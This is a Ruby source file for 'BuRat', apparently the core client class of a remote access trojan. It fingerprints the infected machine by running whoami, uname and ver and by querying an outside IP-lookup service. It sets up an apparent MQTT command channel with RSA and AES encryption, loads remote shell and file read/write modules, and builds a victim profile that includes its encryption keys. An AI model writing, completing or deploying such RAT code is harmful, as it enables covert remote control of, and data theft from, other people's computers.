require 'securerandom'
require 'os'
require 'open-uri'
require 'paho-mqtt'

require_relative 'internals/encryption'
require_relative 'internals/serialization'
require_relative 'bushido/filerw/bufilerw'
require_relative 'bushido/remoteshell/buremoteshell'

class BuRat
  attr_reader :id, :host, :os, :ip
  attr_accessor :status, :internals, :bushido
  def initialize()
    @id = SecureRandom.hex(2)
    @host = OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
    @os = (OS.windows? ? `ver` : `uname -sr`).strip
    @ip = open('http://whatismyip.akamai.com').read
    @status = :offline
    @internals = {
      :mqtt           => PahoMqtt::Client.new,
      :serialization  => Internals::Serialization.new,
      :rsa            => Internals::RSA.new,
      :aes            => Internals::AES.new,
      :digest         => Internals::Digest.new
    }
    @bushido = {
      :remoteshell    => Bushido::BuRemoteShell.new,
      :filerw         => Bushido::BuFileReadWrite.new
    }
  end

  def profile()
    return profile = {
    	:id => @id,
    	:host => @host,
    	:os => @os,
    	:ip => @ip,
    	:status => @status,
    	:aes => {
    		:key => @internals[:aes].key,
    		:iv => @internals[:aes].iv
    	}
    }
  end

  def seen(data)
  	data = @internals[:serialization].serialize(data)
  	data = @internals[:aes].encrypt(data)
  	return data
  end

  def deseen(data)
  	data = @internals[:aes].decrypt(data)
  	data = @internals[:serialization].deserialize(data)
  	return data
  end
end
